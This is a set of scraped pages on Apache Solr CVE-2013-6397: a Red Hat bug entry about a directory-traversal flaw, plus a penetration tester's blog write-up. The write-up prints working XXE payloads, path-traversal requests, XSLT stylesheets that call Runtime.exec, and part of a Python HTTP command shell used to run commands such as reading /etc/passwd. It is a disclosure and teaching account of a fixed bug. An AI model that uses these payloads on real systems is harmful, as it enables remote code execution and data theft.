charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1035988](show_bug.cgi?id=1035988) [1035989](show_bug.cgi?id=1035989) [1038297](show_bug.cgi?id=1038297) [1043748](show_bug.cgi?id=1043748) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [991853](show_bug.cgi?id=991853) [1035063](show_bug.cgi?id=1035063) | | TreeView+ | [depends on](buglist.cgi?bug_id=1035062&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1035062&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2013-11-27 01:08 UTC by David Jorm | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-02-17 07:08 UTC ([History](show_activity.cgi?id=1035062)) | | [CC List:](page.cgi?id=fields.html#cclist) | 7 users (show)  aneelica chazlett dstahl jrusnack mjc pavelp weli | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2014-01-15 18:24:04 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2013:1844](https://access.redhat.com/errata/RHSA-2013%3A1844) | 0 | normal | SHIPPED\_LIVE | Important: Red Hat JBoss Web Framework Kit 2.4.0 update | 2013-12-16 23:21:40 UTC | | Red Hat Product Errata | [RHSA-2014:0029](https://access.redhat.com/errata/RHSA-2014%3A0029) | 0 | normal | SHIPPED\_LIVE | Important: Red Hat JBoss Data Grid 6.2.0 update | 2014-01-15 22:45:50 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1035062#c0)  David Jorm    2013-11-27 01:08:12 UTC  ``` It was found that the SolrResourceLoader class in Apache Solr allowed loading of resources via absolute paths, or relative paths which were not sanitized for directory traversal. Some Solr components expose REST interfaces which load resources (XSL stylesheets and Velocity templates) via SolrResourceLoader, using paths identified by REST parameters. A remote attacker could use this flaw to load arbitrary local files on the server via SolrResourceLoader, potentially resulting in information disclosure or remote code execution.   ```  [Comment 1](show_bug.cgi?id=1035062#c1)  David Jorm    2013-11-28 23:04:24 UTC  ``` External References:  <http://www.agarri.fr/kom/archives/2013/11/27/compromising_an_unreachable_solr_server_with_cve-2013-6397/index.html>   ```  [Comment 2](show_bug.cgi?id=1035062#c2)  David Jorm    2013-11-29 01:31:13 UTC  ``` Upstream Bugs:  <https://issues.apache.org/jira/browse/SOLR-4882> <https://issues.apache.org/jira/browse/SOLR-5520>  Upstream Patches:  <https://issues.apache.org/jira/secure/attachment/12604396/SOLR-4882.patch> <https://issues.apache.org/jira/secure/attachment/12618097/CVE-fixes-Solr36.patch>   ```  [Comment 10](show_bug.cgi?id=1035062#c10)  errata-xmlrpc    2013-12-16 18:23:16 UTC  ``` This issue has been addressed in following products:    Red Hat JBoss Web Framework Kit 2.4.0  Via RHSA-2013:1844 <https://rhn.redhat.com/errata/RHSA-2013-1844.html>   ```  [Comment 11](show_bug.cgi?id=1035062#c11)  errata-xmlrpc    2014-01-15 17:46:48 UTC  ``` This issue has been addressed in following products:    Red Hat JBoss Data Grid 6.2.0  Via RHSA-2014:0029 <https://rhn.redhat.com/errata/RHSA-2014-0029.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1035062&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from www.agarri.fr_b698ce05_20250125_155137.html ===


* [Home](/en/index.html "Home page")
* [Company](/en/company.html "Company details")
* [Publications](/en/publications.html "Public interventions and published vulnerabilities")
* [Trainings](/en/trainings.html "Burp Suite Pro training")
* [Blog](/blog/ "Technical analysis and personnal opinions")
* [![fr](/images/fr.png)](/fr/ "French version")

[Main](https://www.agarri.fr/blog/index.html) >
[Archives](https://www.agarri.fr/blog/archives/index.html) >
[2013](https://www.agarri.fr/blog/archives/2013/index.html) >

[11](https://www.agarri.fr/blog/archives/2013/11/index.html) >

[<](https://www.agarri.fr/blog/archives/2013/10/22/exploiting_wpad_with_burp_suite_and_the_http_injector_extension/index.html)

17:32:42
[>](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html)
## mercredi 27 novembre 2013, 17:32:42 (UTC+0100)

### Compromising an unreachable Solr server with CVE-2013-6397

I recently did a pentest where I compromised a Solr server located several layers deep in a network. This hack used a few XML-related vulnerabilities and I consider it as a good example of how several small defects can be combined for full compromise.

The target application allows authenticated users to upload, manage and search documents. Documents can be public or not, restricted to a user, a group or an organization. The creator of a group can invite other users, either "in app" or by sending an email with a XML-based invitation attached. Documents uploaded by users are stored on a file-server and may be processed by another application (Solr), depending on their status and format. [Solr](http://lucene.apache.org/solr/) is a search platform edited by Apache. From its website: *"its major features include powerful full-text search, hit highlighting, faceted search, near real-time indexing, dynamic clustering, database integration, rich document (e.g., Word, PDF) handling, and geospatial search".*

The network architecture is very common. Three DMZ, one hosting a HTTPS front-end (DMZ "A"), one with a Java application server (DMZ "B") and one dedicated to data storage (database and file server, in DMZ "C"). The firewall rules are quite strict, with no outbound traffic and only a few inbound rules:
- HTTPS (TCP/443) from the Internet to DMZ "A"
- HTTP (TCP/8080) from DMZ "A" to DMZ "B"
- Oracle (TCP/1521), Solr (TCP/8983) and NFS (TCP/2049) from DMZ "B" to DMZ "C"

The Java application hosted in DMZ "B" has already endured a few pentests, but I found a XXE ("XML eXternal Entity" aka [CWE-611](http://cwe.mitre.org/data/definitions/611.html)) vulnerability in the newly introduced XML-based invitation feature. Given that the application is based on Java (with a recent JRE):

- directories can be listed using "file://MY\_DIR/"

- valid XML files in ASCII or UTF-8 format can be read using "file://MY\_DIR/MY\_FILE"

- plain text files (no markup, no entities) in ASCII or UTF-8 can also be read using "file://MY\_DIR/MY\_FILE"

- the Gopher handler "gopher:" is disabled (afaik since Java 7)

- the HTTP and HTTPS URL handlers are available

The first task was to use the XXE vulnerability to explore the filesystem and try to collect information like usernames, passwords, source code,... However, I was very unlucky because most of the interesting files were unreadable. Either they are in a binary format (JAR, Word, PDF) or they contain invalid XML (like most HTML pages) or accents (thanks to French developpers!). NB: you may use the "jar:" URL scheme when accessing JAR files (and other ZIP containers), cf. [this conference](http://www.youtube.com/watch?v=eHSNT8vWLfc) by Timothy Morgan at OWASP AppSec USA 2013.

So, let's use the XXE vulnerability only as a proxy in order to port-scan the internal network. 127.0.0.1 was, of course, the first target but nothing interesting was found. Then I tried to scan one of my public servers. No outbound traffic :-( At least, file "/etc/fstab" gave me the IP address of the NFS server (let's say 192.168.42.42), and I thorougly scanned it. 65532 filtered ports, 1 closed (TCP/1521) and 2 open (TCP/8983 and TCP/2049).

Well, port TCP/8983 is open? That's the default port used by Solr. And Solr is [advertised](http://wiki.apache.org/solr/SolrSecurity) as insecure by default: *"Solr does not concern itself with security either at the document level or the communication level"*. So I need to verify if I really found a Solr server. As previously said, most HTML pages are not suitable with this kind of XXE. However, the Solr [Web interface](https://cwiki.apache.org/confluence/display/solr/Overview%2Bof%2Bthe%2BSolr%2BAdmin%2BUI) proposes some static CSS files (for example "/solr/admin/solr-admin.css" in old versions like 3.6.2 and "/solr/css/jetty-dir.css" in modern ones) and some dynamic information pages (for example "/solr/admin/get-properties.jsp" in old versions and "/solr/admin/info/system" in modern ones). When accessing "/solr/admin/info/system", the response is sent back in XML format (by default) or JSON (using "?wt=json"). As shown by the following screenshot, a Solr 4.5.0 instance using Oracle Java 7u45 was found using the following DOCTYPE:

```

<!DOCTYPE sploit [
    <!ENTITY boom SYSTEM "http://192.168.42.42:8983/solr/admin/info/system?wt=xml">
]>

```
![](/docs/solr-props.png)

After downloading a version of Solr similar to the version used by the target, I began to look for vulnerabilities. Even if I could leak a lot of information (about the Solr instances, about the underlying OS, about the content of stored documents), I would love to gain a shell. And given that the Solr interface is accessed through a XXE vulnerability, I can only use GET requests (no POST, no PUT).

When reading the documentation, I saw that Solr uses XSLT. And you know how much I love XSLT ;-) From the [documentation](https://cwiki.apache.org/confluence/display/solr/Response%2BWriters#ResponseWriters-TheXSLTResponseWriter), the *"XSLT Response Writer applies an XML stylesheet to output"*. Furthermore, this ResponseWriter "*accepts one parameter: the tr parameter, which identifies the XML transformation to use"* and *"the transformation must be found in the Solr conf/xslt directory*". Here's a sample query using the XSLT Response Writer and the "example\_rss.xsl" stylesheet:

```

<!DOCTYPE sploit [
    <!ENTITY boom SYSTEM "http://192.168.42.42:8983/solr/select/?q=31337&wt=xslt&tr=example_rss.xsl">
]>

```
![](/docs/solr-rss.png)

There is however no interesting (I mean exploitable) XSLT stylesheets in the "conf/xslt" directory. Maybe that's a job for our old friend "../" ;-) On some Linux systems, file "/usr/share/ant/etc/ant-update.xsl" is present. This file comes from the "ant-optional" package, itself recommended when installing the "ant" package. And most importantly, this stylesheet applies a "near-identity transform" which allows us to read the raw Solr response:

```

<!DOCTYPE sploit [
    <!ENTITY boom SYSTEM "http://192.168.42.42:8983/solr/select/?q=31337&wt=xslt&tr=../../../../../../../../../../../../../../../../../usr/share/ant/etc/ant-update.xsl">
]>

```
![](/docs/solr-ant.png)

Fine! We are getting closer to our objective, because execution of arbitrary XSLT code in a non-hardened Java application usually means ... execution of arbitrary Java code!

Now I need to provide my own "malicious" XSLT stylesheets. Given that documents (like Word documents) uploaded via the Web application and tagged as "public" are searchable in full-text, they are probably processed by Solr. As TCP/2049 is open on this server, files are probably stored on the Solr server and read/written by the Web application via NFS. Using error messages, brute-force and luck, I was able to find where my own documents were stored (suppose "/var/data/user/666/"). NB: the file upload trick using the "jar:" URL scheme (cf [this video](http://www.youtube.com/watch?v=eHSNT8vWLfc)) isn't applicable in this context, because there's no outbound open port. Now that I know where my files are uploaded, and before dropping a Java payload, I need to know which engine is used. This is very easy using xsl:system-property().

The uploaded XSLT stylesheet "recon.xsl":

```

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    Version : <xsl:value-of select="system-property('xsl:version')" />
    Vendor : <xsl:value-of select="system-property('xsl:vendor')" />
    Vendor URL : <xsl:value-of select="system-property('xsl:vendor-url')" />
  </xsl:template>
</xsl:stylesheet>

```

The related DOCTYPE:

```

<!DOCTYPE sploit [
    <!ENTITY boom SYSTEM "http://192.168.42.42:8983/solr/select/?q=31337&wt=xslt&tr=../../../../../../../../../../../../../../../../../var/data/user/666/recon.xsl">
]>

```

And the output, stating that [Apache Xalan-J](http://xml.apache.org/xalan-j/) is used:

![](/docs/solr-recon.png)

Last check: is it really possible to execute arbitrary Java code? Let's upload a basic PoC, just calling java.util.Date:new():

```

<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:date="http://xml.apache.org/xalan/java/java.util.Date"
    exclude-result-prefixes="date">
  <xsl:output method="text"/>
  <xsl:template match="/">
   <xsl:variable name="dateObject" select="date:new()"/>
   <xsl:text>Current date: </xsl:text><xsl:value-of select="$dateObject"/>
  </xsl:template>
</xsl:stylesheet>

```

The related DOCTYPE:

```

<!DOCTYPE sploit [
    <!ENTITY boom SYSTEM "http://192.168.42.42:8983/solr/select/?q=31337&wt=xslt&tr=../../../../../../../../../../../../../../../../../var/data/user/666/date.xsl">
]>

```

And the output, showing that executing arbitrary Java code is possible!

![](/docs/solr-date.png)

It would now be easy to execute a Java Meterpreter from XSLT using [Java Payload](http://schierlm.users.sourceforge.net/JavaPayload/). But without any direct inbound or outbound port, this wouldn't be really useful :-( However, port TCP/1521 is closed on the Solr server but reachable from the Java server. Why not develop/upload/execute some code binding TCP/1521, reachable via the XXE vulnerability and somewhat emulating a shell?

The XSLT stylesheet executing our own Python shell (yes, that's **XSLT to Java to Python to Bash**!):

```

<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:date="http://xml.apache.org/xalan/java/java.util.Date"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:str="http://xml.apache.org/xalan/java/java.lang.String"
    exclude-result-prefixes="date">

  <xsl:output method="text"/>
  <xsl:template match="/">

   <xsl:variable name="cmd"><![CDATA[/usr/bin/python /var/data/user/666/http2cmd.py]]></xsl:variable>
   <xsl:variable name="rtObj" select="rt:getRuntime()"/>
   <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
   <xsl:text>Process: </xsl:text><xsl:value-of select="$process"/>

  </xsl:template>
</xsl:stylesheet>

```

And an extract from my "http2cmd.py" script (based on [BaseHTTPServer](http://docs.python.org/2/library/basehttpserver.html), you can dowload it from [here](/docs/http2cmd.py)):

```

[...]
	# Handle only GET requests
	def do_GET(self):

		try:
			[...]

			# Execute a shell command (pipes and wildcards are OK)
			if action == '/shell':
				cmd = args['cmd'][0]
				# Input encoding
				if 'i64' in args:
					cmd = base64.b64decode(cmd)
				data = subprocess.check_output(cmd, shell=True)

			# Execute some Python code
			elif action == '/python':
				code = args['code'][0]
				# Input encoding
				if 'i64' in args:
					code = base64.b64decode(code)
				data = self.exec_stdout(code)

			[...]

```

Now, we can execute arbitrary shell commands or Python code on the Solr server, and get the output back to us. We can also use the optional Base64 input/output encoding to hide suspicious strings or exfiltrate binary data.

**GAME OVER!**

```

<!DOCTYPE sploit [
    <!ENTITY boom SYSTEM "http://192.168.42.42:1521/shell?cmd=uname%20-s">
]>

```
![](/docs/solr-uname.png)

```

<!DOCTYPE sploit [
    <!ENTITY boom SYSTEM "http://192.168.42.42:1521/shell?o64%26cmd=head%20/etc/passwd">
]>

```
![](/docs/solr-passwd.png)

```

<!DOCTYPE sploit [
    <!ENTITY boom SYSTEM "http://192.168.42.42:1521/python?i64%26code=aW1wb3J0IHN5cwpwcmludCByZXByKCdPUyBwbGF0Zm9ybTogJXMnICUgc3lzLnBsYXRmb3JtKQpwcmludCByZXByKCdQeXRob24gdmVyc2lvbjogJXMnICUgc3lzLnZlcnNpb24pCg%3d%3d">
]>

```
![](/docs/solr-python.png)

Of course, I reported the Solr vulnerabilities (the XSLT one and a few others) to the Apache security team, who forwarded them to the Lucene team. Part of their risk analysis was that *"you cannot use the vulnerabilities without access to the server's filesystem to place malicious files there"*. At that time, I was OK with their statement. But if you find another XXE in Solr itself (cf [SOLR-3895](https://issues.apache.org/jira/browse/SOLR-3895) and [SOLR-4881](https://issues.apache.org/jira/browse/SOLR-4881)) and have a way to access your own documents via HTTP from the Solr server, then the novel file upload trick using "jar:" (by [@ecbftw](https://twitter.com/ecbftw)) could definitely help.

Bottom line: ticket [SOLR-4882](https://issues.apache.org/jira/browse/SOLR-4882) was created in order to track the directory traversal vulnerability (affecting both XSLT stylesheets and Velocity templates). The bug was fixed in version [4.6.0](http://www.apache.org/dyn/closer.cgi/lucene/solr/4.6.0), released [a few days ago](http://lucene.apache.org/solr/solrnews.html). Identifier [CVE-2013-6397](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6397) was affected to this vulnerability. If you are running Solr, do not expose it on the Internet, do not expose it on a LAN which can be reached from another machine vulnerable to SSRF, do not expose it on localhost if the server itself hosts an application vulnerable to SSRF. And I mean **any** SSRF (aka [CWE-918](http://cwe.mitre.org/data/definitions/918.html)), not just XXE (aka [CWE-611](http://cwe.mitre.org/data/definitions/611.html))!

That's all, folks! I hope you enjoyed this short journey into the world of XML hacking.

Posted by Nicolas GrÃ©goire
| [Permanent link](https://www.agarri.fr/blog/archives/2013/11/27/compromising_an_unreachable_solr_server_with_cve-2013-6397/index.html)

[/\](#top)

### webmaster@agarri.fr Copyright 2010-2021 Agarri



=== Content from www.redhat.com_8e765add_20250126_100341.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.redhat.com_87f048f3_20250126_100337.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
